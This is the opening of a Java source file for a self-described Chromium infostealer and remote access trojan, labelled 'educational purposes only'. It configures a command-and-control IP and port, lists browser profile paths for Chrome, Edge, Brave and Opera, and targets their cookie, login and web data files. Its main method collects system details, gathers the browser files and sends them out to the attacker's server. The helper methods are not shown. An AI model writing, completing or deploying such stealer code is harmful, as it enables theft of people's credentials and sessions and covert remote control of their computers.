import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

/**
 * EDUCATIONAL PURPOSES ONLY.
 * A Chromium-focused Infostealer and RAT.
 * 
 * Features:
 * 1. Steals Cookies, Session Storage, and Login Data from Chromium-based browsers.
 * 2. Collects HWID (MAC hash), IP, and Geolocation (via IP).
 * 3. Establishes a reverse shell (RAT) connection.
 * 
 * NOTE: Actual password decryption requires OS-level API access (DPAPI on Windows).
 * This tool exfiltrates the encrypted database files. Decryption is typically performed
 * offline by the attacker if they can bypass OS security, or via session hijacking.
 */
public class ChromiumStealerRAT {

    // CONFIGURATION
    private static final String C2_IP = "127.0.0.1"; // Replace with your IP
    private static final int C2_PORT = 4444;
    
    // Chromium Paths (Windows)
    private static final String[] CHROMIUM_PATHS = {
        "\\AppData\\Local\\Google\\Chrome\\User Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "\\AppData\\Local\\Opera Software\\Opera Stable",
        "\\AppData\\Roaming\\Opera Software\\Opera Stable"
    };

    // Target Files
    private static final String[] TARGET_FILES = {
        "Default/Cookies",
        "Default/Network/Cookies",
        "Default/Login Data",
        "Default/Web Data",
        "Profile 1/Cookies", // Secondary profiles
        "Profile 1/Login Data"
    };

    public static void main(String[] args) {
        // Prevent GUI alerts if running as a background process (basic attempt)
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "echo");
            pb.start();
        } catch (IOException e) { /* Ignore */ }

        System.out.println("Initializing Agent...");
        
        // 1. Collect System Info
        String systemInfo = collectSystemInfo();
        System.out.println("System Info Collected.");

        // 2. Steal Browser Data
        List<FileData> stolenData = stealChromiumData();
        System.out.println("Browser data collection complete. Items found: " + stolenData.size());

        // 3. Connect to C2 and Exfiltrate
        connectAndExfiltrate(systemInfo, stolenData);
    }